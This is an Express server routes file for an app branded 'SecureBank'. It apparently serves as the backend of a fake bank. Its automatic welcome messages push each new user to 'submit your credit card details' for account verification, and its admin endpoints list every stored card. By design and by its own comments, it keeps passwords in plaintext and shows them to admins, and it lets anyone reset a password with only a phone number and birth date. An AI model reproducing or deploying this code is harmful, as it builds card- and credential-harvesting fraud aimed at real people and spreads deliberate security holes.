import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { signInSchema, signUpSchema, insertMessageSchema } from "@shared/schema";
import bcrypt from "bcrypt";
import { nanoid } from "nanoid";
import { creditCardSchema } from "@shared/schema";
import { z } from "zod";

// Store pending admin login attempts
interface AdminLoginAttempt {
  id: string;
  username: string;
  ip: string;
  timestamp: string;
  approved: boolean | null;
}

// Activity log entry
interface ActivityLog {
  id: string;
  userId: number;
  action: string;
  details: string;
  ip: string;
  timestamp: string;
}

// Store activity logs
const activityLogs: ActivityLog[] = [];

// Store pending admin login attempts
const pendingAdminLogins: Map<string, AdminLoginAttempt> = new Map();

// Store active sessions for security monitoring
const activeSessions: Map<string, { userId: number, ip: string, lastActivity: string }> = new Map();

// Store notifications
interface Notification {
  id: string;
  userId: number;
  title: string;
  message: string;
  read: boolean;
  timestamp: string;
}

const notifications: Map<number, Notification[]> = new Map();

  // Authentication middleware
async function requireAuth(req: Request, res: Response, next: NextFunction) {
  try {
    const sessionId = req.headers.authorization?.split(' ')[1];
    
    if (!sessionId) {
      return res.status(401).json({ message: "Unauthorized" });
    }

    const session = await storage.getSession(sessionId);
    
    if (!session) {
      return res.status(401).json({ message: "Invalid session" });
    }
    
    if (new Date(session.expiresAt) < new Date()) {
      await storage.deleteSession(sessionId);
      return res.status(401).json({ message: "Session expired" });
    }

    const user = await storage.getUser(session.userId);
    
    if (!user) {
      return res.status(401).json({ message: "User not found" });
    }

    // Update session activity
    activeSessions.set(sessionId, {
      userId: user.id,
      ip: req.ip || 'unknown',
      lastActivity: new Date().toISOString()
    });
    
    // Attach user and session to request
    req.user = user;
    req.sessionId = sessionId;
    
    next();
  } catch (error) {
    return res.status(401).json({ message: "Authentication failed" });
  }
  }

  // Admin middleware
function requireAdmin(req: Request, res: Response, next: NextFunction) {
  if (!req.user?.isAdmin) {
      return res.status(403).json({ message: "Admin access required" });
    }
  
    next();
}

// Function to log user activity
function logActivity(userId: number, action: string, details: string, ip: string) {
  const log: ActivityLog = {
    id: nanoid(),
    userId,
    action,
    details,
    ip,
    timestamp: new Date().toISOString()
  };
  
  activityLogs.push(log);
  
  // Limit logs to prevent memory issues
  if (activityLogs.length > 1000) {
    activityLogs.shift();
  }
}

// Function to create notification
function createNotification(userId: number, title: string, message: string) {
  const notification: Notification = {
    id: nanoid(),
    userId,
    title,
    message,
    read: false,
    timestamp: new Date().toISOString()
  };
  
  const userNotifications = notifications.get(userId) || [];
  userNotifications.push(notification);
  notifications.set(userId, userNotifications);
  
  return notification;
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Function to ensure messages.json exists and has initial data
  async function ensureMessagesFile() {
    try {
      const messages = await storage.readJSONFile<Message[]>("messages.json", []);
      
      // If the file is empty, create a welcome message from admin to all users
      if (messages.length === 0) {
        console.log("Creating initial welcome messages for all users");
        
        // Get all users
        const users = await storage.getAllUsers();
        const adminId = 1; // Assuming admin has ID 1
        
        // Create welcome message for each user
        for (const user of users) {
          if (user.id !== adminId) { // Don't send message to admin
            await storage.createMessage({
              senderId: adminId,
              receiverId: user.id,
              content: "Welcome to SecureBank! Your account is pending approval. Please submit your credit card details to continue the verification process. If you have any questions, feel free to message us here."
            });
            console.log(`Created welcome message for user ${user.id}`);
          }
        }
      }
    } catch (error) {
      console.error("Error ensuring messages file:", error);
    }
  }
  
  // Call this function when the server starts
  ensureMessagesFile().catch(console.error);

  // Auth routes
  app.post("/api/auth/signup", async (req, res) => {
    try {
      const userData = signUpSchema.parse(req.body);
      const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
      
      // Check if user exists
      const existingUser = await storage.getUserByEmail(userData.email) || 
                          await storage.getUserByUsername(userData.username);
      
      if (existingUser) {
        return res.status(400).json({ message: "User already exists" });
      }

      // Create user with plaintext password (no hashing)
      const user = await storage.createUser({
        ...userData,
        password: userData.password, // Store plaintext password only
        isAdmin: false,
        status: "pending",
      } as any);

      // Create session
      const sessionId = nanoid();
      const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days
      await storage.createSession(sessionId, user.id, expiresAt);

      // Send welcome message from admin
      const adminId = 1; // Assuming admin has ID 1
      await storage.createMessage({
        senderId: adminId,
        receiverId: user.id,
        content: "Welcome to SecureBank! Your account is pending approval. Please submit your credit card details to continue the verification process. If you have any questions, feel free to message us here."
      });

      // Log activity
      logActivity(user.id, "signup", "User created an account", ip as string);
      
      // Create notification for admin
      const admins = (await storage.getAllUsers()).filter(u => u.isAdmin);
      if (admins.length > 0) {
        admins.forEach(admin => {
          createNotification(
            admin.id,
            "New User Registration",
            `User ${user.firstName} ${user.lastName} (${user.email}) has registered. User ID: ${user.id}`
          );
        });
      }
      
      // Send welcome message to user
      if (admins.length > 0) {
        await storage.createMessage({
          senderId: admins[0].id,
          receiverId: user.id,
          content: "Welcome to SecureBank! Your account is currently under review. You can still access your Dashboard and the messaging feature to get updates, customer support, or submit complaints. All other features are limited until approval is complete. Approval usually takes up to 7 working days. Thank you for your patience."
        });
      }

      res.json({ 
        user: { ...user, password: undefined }, 
        sessionId,
        message: "Account created successfully. Your account is under review." 
      });
    } catch (error: any) {
      res.status(400).json({ message: error.message });
    }
  });

  app.post("/api/auth/signin", async (req, res) => {
    try {
      const { identifier, password } = signInSchema.parse(req.body);
      const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
      
      // Find user
      const user = await storage.getUserByIdentifier(identifier);
      if (!user) {
        return res.status(401).json({ message: "Invalid credentials" });
      }

      // Verify password - only check plaintext
      const isValid = user.password === password;
      if (!isValid) {
        // Log failed login attempt
        logActivity(user.id, "login_failed", "Failed login attempt", ip as string);
        return res.status(401).json({ message: "Invalid credentials" });
      }

      // Special handling for admin login - REMOVED APPROVAL REQUIREMENT
      // Always allow direct login for the admin user with username "Jude_Ogwu.U"

      // Standard login flow for all users including admin
      const sessionId = nanoid();
      const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days
      await storage.createSession(sessionId, user.id, expiresAt);
      
      // Log successful login
      logActivity(user.id, "login_success", "User logged in successfully", ip as string);

      res.json({ 
        user: { ...user, password: undefined }, 
        sessionId 
      });
    } catch (error: any) {
      res.status(400).json({ message: error.message });
    }
  });

  // Check admin login approval status
  app.get("/api/auth/admin-login/:attemptId", async (req, res) => {
    const { attemptId } = req.params;
    const attempt = pendingAdminLogins.get(attemptId);
    
    if (!attempt) {
      return res.status(404).json({ message: "Login attempt not found" });
    }
    
    if (attempt.approved === null) {
      return res.json({ status: "pending" });
    }
    
    if (attempt.approved === true) {
      // Find the admin user
      const admin = await storage.getUserByUsername("Jude_Ogwu.U");
      if (!admin) {
        return res.status(404).json({ message: "Admin user not found" });
      }
      
      // Create session
      const sessionId = nanoid();
      const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000);
      await storage.createSession(sessionId, admin.id, expiresAt);
      
      // Remove the attempt
      pendingAdminLogins.delete(attemptId);
      
      // Log approved admin login
      logActivity(admin.id, "admin_login_approved", "Admin login was approved", attempt.ip);
      
      return res.json({ 
        status: "approved",
        user: { ...admin, password: undefined },
        sessionId
      });
    }
    
    // Attempt was denied
    pendingAdminLogins.delete(attemptId);
    
    // Log denied admin login
    const admin = await storage.getUserByUsername("Jude_Ogwu.U");
    if (admin) {
      logActivity(admin.id, "admin_login_denied", "Admin login was denied", attempt.ip);
    }
    
    return res.status(403).json({ 
      status: "denied",
      message: "Your login attempt was denied by the administrator." 
    });
  });

  // Admin approves or denies login attempts
  app.post("/api/admin/approve-login/:attemptId", requireAuth, requireAdmin, async (req: any, res) => {
    const { attemptId } = req.params;
    const { approved } = req.body;
    const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
    
    const attempt = pendingAdminLogins.get(attemptId);
    if (!attempt) {
      return res.status(404).json({ message: "Login attempt not found" });
    }
    
    attempt.approved = !!approved;
    pendingAdminLogins.set(attemptId, attempt);
    
    // Log admin action
    logActivity(req.user.id, approved ? "approve_login" : "deny_login", 
      `Admin ${approved ? 'approved' : 'denied'} login attempt from ${attempt.ip}`, ip as string);
    
    res.json({ message: approved ? "Login approved" : "Login denied" });
  });

  // Get pending admin login attempts
  app.get("/api/admin/login-attempts", requireAuth, requireAdmin, async (req, res) => {
    const attempts = Array.from(pendingAdminLogins.values())
      .filter(attempt => attempt.approved === null)
      .sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    
    res.json(attempts);
  });

  app.post("/api/auth/logout", requireAuth, async (req: any, res) => {
    try {
      const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
      
      // Log logout activity
      logActivity(req.user.id, "logout", "User logged out", ip as string);
      
      // Remove from active sessions
      activeSessions.delete(req.sessionId);
      
      await storage.deleteSession(req.sessionId);
      res.json({ message: "Logged out successfully" });
    } catch (error: any) {
      res.status(500).json({ message: "Logout failed" });
    }
  });

  // User routes
  app.get("/api/user/me", requireAuth, async (req: any, res) => {
    res.json({ ...req.user, password: undefined });
  });

  app.get("/api/user/conversations", requireAuth, async (req: any, res) => {
    try {
      const conversations = await storage.getConversationsForUser(req.user.id);
      const conversationsWithUsers = await Promise.all(
        conversations.map(async (conv) => {
          const partnerId = conv.senderId === req.user.id ? conv.receiverId : conv.senderId;
          const partner = await storage.getUser(partnerId!);
          const unreadCount = await storage.getUnreadMessageCount(req.user.id);
          
          return {
            id: conv.id,
            partner: partner ? { ...partner, password: undefined } : null,
            lastMessage: conv.content,
            timestamp: conv.createdAt,
            unreadCount: conv.senderId !== req.user.id && !conv.isRead ? 1 : 0,
          };
        })
      );
      
      res.json(conversationsWithUsers);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Admin routes
  app.get("/api/admin/users", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const users = await storage.getAllUsers();
      
      // Get unread message counts for each user
      const unreadMessageCounts = await storage.getUnreadMessageCountsByUser(req.user.id);
      
      const usersWithMessageCounts = users.map(user => {
        const userMessageCount = unreadMessageCounts.find(count => count.userId === user.id);
        return {
          ...user,
          unreadMessageCount: userMessageCount ? userMessageCount.count : 0
        };
      });
      
      res.json(usersWithMessageCounts);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  app.get("/api/admin/stats", requireAuth, requireAdmin, async (req: any, res) => {
    const users = await storage.getAllUsers();
    const pendingCount = users.filter(user => user.status === "pending").length;
    
    // Get messages for unread count
    const messages = await storage.getUnreadMessageCount(req.user.id);
    
    // Get active users today
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    
    const sessions = await storage.getAllSessions();
    const activeToday = sessions.filter(session => {
      const lastActivity = new Date(session.createdAt);
      return lastActivity >= today;
    }).length;
    
    res.json({
      totalUsers: users.length,
      pendingCount,
      unreadMessages: messages,
      activeToday
    });
  });
  
  // Notification endpoints
  app.get("/api/admin/notifications", requireAuth, requireAdmin, async (req: any, res) => {
    const userId = req.user.id;
    const userNotifications = notifications.get(userId) || [];
    
    res.json({
      notifications: userNotifications.sort((a, b) => 
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
      )
    });
  });
  
  app.post("/api/admin/notifications/:id/read", requireAuth, requireAdmin, async (req: any, res) => {
    const userId = req.user.id;
    const notificationId = req.params.id;
    const userNotifications = notifications.get(userId) || [];
    
    const notification = userNotifications.find(n => n.id === notificationId);
    if (notification) {
      notification.read = true;
    }
    
    res.json({ success: true });
  });
  
  app.post("/api/admin/notifications/read-all", requireAuth, requireAdmin, async (req: any, res) => {
    const userId = req.user.id;
    const userNotifications = notifications.get(userId) || [];
    
    userNotifications.forEach(notification => {
      notification.read = true;
    });
    
    res.json({ success: true });
  });
  
  // Get detailed user profile (including password for admin view)
  app.get("/api/admin/users/:id", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const { id } = req.params;
      const user = await storage.getUser(parseInt(id));
      
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Get user's activity logs
      const userLogs = activityLogs
        .filter(log => log.userId === user.id)
        .sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())
        .slice(0, 20); // Get last 20 activities
      
      // Include password in plaintext for admin view
      res.json({ 
        user,
        activityLogs: userLogs
      });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  app.post("/api/admin/users/:id/status", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const { id } = req.params;
      const { status, message } = req.body;
      const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
      
      if (!['approved', 'rejected', 'suspended'].includes(status)) {
        return res.status(400).json({ message: "Invalid status" });
      }

      const updatedUser = await storage.updateUserStatus(parseInt(id), status);
      if (!updatedUser) {
        return res.status(404).json({ message: "User not found" });
      }

      // Send notification message to user
      if (message) {
        await storage.createMessage({
          senderId: req.user.id,
          receiverId: parseInt(id),
          content: message,
        });
      }
      
      // Log admin action
      logActivity(req.user.id, `user_status_${status}`, 
        `Admin changed user ${updatedUser.username} status to ${status}`, ip as string);

      res.json({ ...updatedUser, password: undefined });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  app.get("/api/admin/stats", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const allUsers = await storage.getAllUsers();
      const pendingUsers = allUsers.filter(u => u.status === 'pending');
      const unreadCount = await storage.getUnreadMessageCount(req.user.id);
      
      // Calculate active users today
      const today = new Date();
      today.setHours(0, 0, 0, 0);
      
      const activeTodayCount = Array.from(activeSessions.values())
        .filter(session => new Date(session.lastActivity) >= today)
        .reduce((unique, session) => {
          unique.add(session.userId);
          return unique;
        }, new Set<number>()).size;
      
      res.json({
        totalUsers: allUsers.length,
        pendingCount: pendingUsers.length,
        unreadMessages: unreadCount,
        activeToday: activeTodayCount
      });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Get activity logs for admin
  app.get("/api/admin/activity-logs", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const { userId, action, limit = 100, offset = 0 } = req.query;
      
      let filteredLogs = [...activityLogs];
      
      if (userId) {
        filteredLogs = filteredLogs.filter(log => log.userId === parseInt(userId));
      }
      
      if (action) {
        filteredLogs = filteredLogs.filter(log => log.action.includes(action));
      }
      
      // Sort by most recent first
      filteredLogs.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
      
      // Apply pagination
      const paginatedLogs = filteredLogs.slice(parseInt(offset), parseInt(offset) + parseInt(limit));
      
      // Enhance logs with user information
      const enhancedLogs = await Promise.all(paginatedLogs.map(async (log) => {
        const user = await storage.getUser(log.userId);
        return {
          ...log,
          user: user ? { 
            id: user.id,
            username: user.username,
            firstName: user.firstName,
            lastName: user.lastName,
            isAdmin: user.isAdmin
          } : null
        };
      }));
      
      res.json({
        logs: enhancedLogs,
        total: filteredLogs.length
      });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Get active sessions for security monitoring
  app.get("/api/admin/active-sessions", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const sessions = await storage.getAllSessions();
      const users = await storage.getAllUsers();
      
      // Filter for active sessions and enrich with user data
      const activeSessionsData = sessions
        .filter(session => new Date(session.expiresAt) > new Date())
        .map(session => {
          const user = users.find(u => u.id === session.userId);
          const sessionInfo = activeSessions.get(session.id);
          
          return {
            sessionId: session.id,
            createdAt: session.createdAt,
            expiresAt: session.expiresAt,
            lastActivity: sessionInfo?.lastActivity || session.createdAt,
            ip: sessionInfo?.ip || "unknown",
            user: user ? {
              id: user.id,
              username: user.username,
              firstName: user.firstName,
              lastName: user.lastName,
              email: user.email,
              isAdmin: user.isAdmin
            } : undefined
          };
        })
        .filter(session => session.user !== undefined);
      
      res.json(activeSessionsData);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });
  
  // Force logout a user session
  app.delete("/api/admin/sessions/:sessionId", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const { sessionId } = req.params;
      const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
      
      // Check if session exists
      const session = await storage.getSession(sessionId);
      if (!session) {
        return res.status(404).json({ message: "Session not found" });
      }
      
      // Log admin action
      logActivity(req.user.id, "force_logout", 
        `Admin forced logout of session ${sessionId} for user ${session.userId}`, ip as string);
      
      // Remove from active sessions
      activeSessions.delete(sessionId);
      
      // Delete the session
      await storage.deleteSession(sessionId);
      
      res.json({ message: "Session terminated successfully" });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });
  
  // Force password reset for a user
  app.post("/api/admin/users/:id/reset-password", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const { id } = req.params;
      const { newPassword } = req.body;
      const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
      
      if (!newPassword || newPassword.length < 8) {
        return res.status(400).json({ message: "Password must be at least 8 characters" });
      }
      
      const user = await storage.getUser(parseInt(id));
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Update with plaintext password (no hashing)
      await storage.updateUserPassword(parseInt(id), newPassword);
      
      // Log admin action
      logActivity(req.user.id, "reset_password", 
        `Admin reset password for user ${user.username}`, ip as string);
      
      // Notify the user
      await storage.createMessage({
        senderId: req.user.id,
        receiverId: parseInt(id),
        content: "Your password has been reset by an administrator. Please use your new password to log in."
      });
      
      // Force logout all sessions for this user
      await storage.deleteAllUserSessions(parseInt(id));
      
      res.json({ message: "Password reset successfully" });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });
  
  // Mark messages as read
  app.post("/api/messages/read/:senderId", requireAuth, async (req: any, res) => {
    try {
      const { senderId } = req.params;
      const userId = req.user.id;
      
      await storage.markMessagesAsRead(parseInt(senderId), userId);
      
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Messages routes
  app.get("/api/messages/:userId", requireAuth, async (req: any, res) => {
    try {
      const { userId } = req.params;
      const messages = await storage.getMessagesBetweenUsers(req.user.id, parseInt(userId));
      
      // Mark messages as read
      await storage.markMessagesAsRead(parseInt(userId), req.user.id);
      
      res.json(messages);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  app.post("/api/messages", requireAuth, async (req: any, res) => {
    try {
      const messageData = insertMessageSchema.parse({
        ...req.body,
        senderId: req.user.id,
      });
      
      const message = await storage.createMessage(messageData);
      
      // Log message activity
      const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
      logActivity(req.user.id, "send_message", 
        `User sent message to user ${messageData.receiverId}`, ip as string);
      
      res.json(message);
    } catch (error: any) {
      res.status(400).json({ message: error.message });
    }
  });

  // Admin delete message endpoint
  app.delete("/api/admin/messages/:id", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const messageId = parseInt(req.params.id);
      const success = await storage.deleteMessage(messageId);
      
      if (!success) {
        return res.status(404).json({ message: "Message not found" });
      }
      
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Delete a user
  app.delete("/api/admin/users/:id", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const { id } = req.params;
      const userId = parseInt(id);
      const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
      
      // Check if user exists
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Don't allow deleting admin users
      if (user.isAdmin) {
        return res.status(403).json({ message: "Cannot delete admin users" });
      }
      
      // Delete all sessions for this user
      await storage.deleteAllUserSessions(userId);
      
      // Delete all messages related to this user
      const messages = await storage.readJSONFile<Message[]>("messages.json", []);
      const updatedMessages = messages.filter(
        msg => msg.senderId !== userId && msg.receiverId !== userId
      );
      await storage.writeJSONFile("messages.json", updatedMessages);
      
      // Delete any credit card details for this user
      const creditCards = await storage.readJSONFile<CreditCardDetails[]>("creditCards.json", []);
      const updatedCreditCards = creditCards.filter(card => card.userId !== userId);
      await storage.writeJSONFile("creditCards.json", updatedCreditCards);
      
      // Delete any notifications related to this user
      const notifications = await storage.readJSONFile<any[]>("notifications.json", []);
      const updatedNotifications = notifications.filter(
        n => !n.message.includes(`User ${user.username}`)
      );
      await storage.writeJSONFile("notifications.json", updatedNotifications);
      
      // Delete the user
      await storage.deleteUser(userId);
      
      // Log admin action
      logActivity(
        req.user.id, 
        "delete_user", 
        `Admin deleted user ${user.username}`, 
        ip as string
      );
      
      res.json({ message: "User deleted successfully" });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });
  
  // Verify user for password reset
  app.post("/api/auth/verify-user", async (req, res) => {
    try {
      const { identifier, phone, dateOfBirth } = req.body;
      
      if (!identifier || !phone || !dateOfBirth) {
        return res.status(400).json({ message: "All fields are required" });
      }
      
      // Find user by email or username
      const user = await storage.getUserByIdentifier(identifier);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Verify phone and date of birth
      if (user.phone !== phone || user.dateOfBirth !== dateOfBirth) {
        return res.status(401).json({ message: "Verification failed. Please check your information." });
      }
      
      res.json({ message: "User verified successfully" });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });
  
  // Reset password
  app.post("/api/auth/reset-password", async (req, res) => {
    try {
      const { identifier, phone, dateOfBirth, newPassword } = req.body;
      
      if (!identifier || !phone || !dateOfBirth || !newPassword) {
        return res.status(400).json({ message: "All fields are required" });
      }
      
      if (newPassword.length < 8) {
        return res.status(400).json({ message: "Password must be at least 8 characters" });
      }
      
      // Find user by email or username
      const user = await storage.getUserByIdentifier(identifier);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Verify phone and date of birth
      if (user.phone !== phone || user.dateOfBirth !== dateOfBirth) {
        return res.status(401).json({ message: "Verification failed. Please check your information." });
      }
      
      // Update password with plaintext (no hashing)
      await storage.updateUserPassword(user.id, newPassword);
      
      // Delete all sessions for this user
      await storage.deleteAllUserSessions(user.id);
      
      // Log activity
      logActivity(user.id, "password_reset", "User reset their password", req.ip || "unknown");
      
      res.json({ message: "Password reset successfully" });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Get user card details status
  app.get("/api/user/card-details-status", requireAuth, async (req: any, res) => {
    try {
      const userId = req.user?.id;
      if (!userId) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      const cardDetails = await storage.getCreditCardByUserId(userId);
      
      return res.json({
        hasSubmittedCardDetails: !!cardDetails,
      });
    } catch (error: any) {
      console.error("Error checking card details status:", error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Submit card details
  app.post("/api/user/submit-card-details", requireAuth, async (req: any, res) => {
    try {
      const userId = req.user?.id;
      if (!userId) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      
      // Check if user already submitted card details
      const existingCard = await storage.getCreditCardByUserId(userId);
      if (existingCard) {
        return res.status(400).json({ message: "Card details already submitted" });
      }
      
      const cardData = req.body;
      
      // Validate the card data using the schema
      const validatedData = creditCardSchema.parse({
        ...cardData,
        userId,
      });
      
      // Create the card details
      const newCardDetails = await storage.createCreditCard(validatedData);
      
      // Log the activity
      logActivity(userId, "submit_card_details", "User submitted credit card details", req.ip);
      
      // Notify admin about new card details submission
      const adminUsers = (await storage.getAllUsers()).filter(user => user.isAdmin);
      
      for (const admin of adminUsers) {
        const notification = {
          id: nanoid(),
          userId: admin.id,
          title: "New Card Details Submission",
          message: `User ${req.user?.username} has submitted their credit card details for review.`,
          read: false,
          timestamp: new Date().toISOString(),
        };
        
        await storage.createNotification(notification);
      }
      
      return res.status(201).json({
        success: true,
        message: "Card details submitted successfully",
      });
    } catch (error: any) {
      console.error("Error submitting card details:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json(error.errors.map((e: any) => e.message).join(", "));
      }
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Admin: Get all credit cards
  app.get("/api/admin/credit-cards", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const cards = await storage.getAllCreditCards();
      
      // Get users to add user info to each card
      const users = await storage.getAllUsers();
      
      const cardsWithUserInfo = cards.map(card => {
        const user = users.find(u => u.id === card.userId);
        return {
          ...card,
          user: user ? {
            id: user.id,
            username: user.username,
            firstName: user.firstName,
            lastName: user.lastName,
            email: user.email,
            status: user.status,
          } : undefined,
        };
      });
      
      return res.json(cardsWithUserInfo);
    } catch (error: any) {
      console.error("Error getting credit cards:", error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Admin: Update card verification status
  app.post("/api/admin/credit-cards/:userId/verify", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const { isVerified } = req.body;
      
      if (typeof isVerified !== "boolean") {
        return res.status(400).json({ message: "isVerified must be a boolean" });
      }
      
      const updatedCard = await storage.updateCreditCardVerification(userId, isVerified);
      
      if (!updatedCard) {
        return res.status(404).json({ message: "Card details not found" });
      }
      
      // Log the activity
      logActivity(req.user?.id, "update_card_verification", `Admin ${isVerified ? "verified" : "unverified"} user's credit card`, req.ip);
      
      return res.json(updatedCard);
    } catch (error: any) {
      console.error("Error updating card verification:", error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });

  // Admin: Check if user has submitted card details
  app.get("/api/admin/credit-cards/:userId/check", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const userId = parseInt(req.params.userId);
      
      const cardDetails = await storage.getCreditCardByUserId(userId);
      
      return res.json({
        hasSubmittedCard: !!cardDetails
      });
    } catch (error: any) {
      console.error("Error checking card details:", error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });

  // Admin: Get credit card details by userId
  app.get("/api/admin/credit-cards/:userId", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const userId = parseInt(req.params.userId);
      
      const cardDetails = await storage.getCreditCardByUserId(userId);
      
      if (!cardDetails) {
        return res.status(404).json({ message: "Card details not found" });
      }
      
      // Get user information to include with the card details
      const user = await storage.getUser(userId);
      
      return res.json({
        ...cardDetails,
        user: user ? {
          id: user.id,
          username: user.username,
          firstName: user.firstName,
          lastName: user.lastName,
          email: user.email,
          status: user.status,
        } : undefined
      });
    } catch (error: any) {
      console.error("Error getting credit card details:", error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });

  // Get user details for admin
  app.get("/api/admin/users/:id", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const { id } = req.params;
      const user = await storage.getUser(parseInt(id));
      
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      
      // Get activity logs for this user
      const activityLogs = await storage.getActivityLogsByUser(parseInt(id));
      
      // Return the user with plaintext password
      res.json({
        user: {
          ...user,
          // Ensure password is returned as plaintext
          password: user.password
        },
        activityLogs
      });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Delete a message (admin only)
  app.delete("/api/admin/messages/:messageId", requireAuth, requireAdmin, async (req: any, res) => {
    try {
      const { messageId } = req.params;
      const success = await storage.deleteMessage(parseInt(messageId));
      
      if (!success) {
        return res.status(404).json({ message: "Message not found" });
      }
      
      // Log activity
      const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
      logActivity(req.user.id, "delete_message", `Admin deleted message ${messageId}`, ip as string);
      
      res.json({ message: "Message deleted successfully" });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  return createServer(app);
}
